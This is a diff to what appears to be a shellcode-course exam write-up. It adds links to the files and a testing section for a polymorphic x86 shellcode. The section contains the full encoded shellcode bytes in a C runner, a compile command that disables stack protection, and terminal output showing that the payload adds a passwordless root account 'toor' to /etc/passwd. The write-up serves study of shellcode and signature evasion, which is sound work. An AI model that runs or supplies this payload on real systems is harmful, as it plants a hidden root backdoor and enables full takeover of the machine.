@@ -45,8 +45,9 @@ In this part I'll create a polymorphic version of the 2nd shellcode.
 
 The files for this part of the assignment are the following:
 
-- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm)
-- [polymorphic_shellcode.nasm]()
+- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm), the original shellcode from Shell-Storm
+- [polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/polymorphic_shellcode.nasm), my polymorphic version of the shellcode above
+- [test_polymorphic_shellcode.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/test_polymorphic_shellcode.c), a C program for testing the polymorphic shellcode
 
 ## Analysis
 
@@ -449,3 +450,48 @@ Exit:
 ```
 
 It terminates the execution. I chose not to clear `EAX` in order to save more bytes, but since this polymorphic version is simply `115%` bigger than the original size, you can just add a `xor eax, eax` before the `inc eax`, since it required only `1 byte`.
+
+### Testing
+
+To test the polymorphic shellcode, I've used the following C program:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75";
+
+main()
+{
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
+
+To compile:
+
+```bash
+gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
+```
+
+Once I've run it, I could see a new entry inside the file `/etc/passwd`:
+
+```bash
+rbct@slae:~/exam/assignment_6/2$ tail -n 3 /etc/passwd
+# landscape:x:104:109::/var/lib/landscape:/bin/false
+# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash
+
+rbct@slae:~/exam/assignment_6/2$ sudo ./shellcode_template 
+# Shellcode length: 123
+
+rbct@slae:~/exam/assignment_6/2$ tail -n 3 /etc/passwd
+# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash
+# toor::0:0:t00r:/root:/bin/bash
+
+rbct@slae:~/exam/assignment_6/2$ 
+```
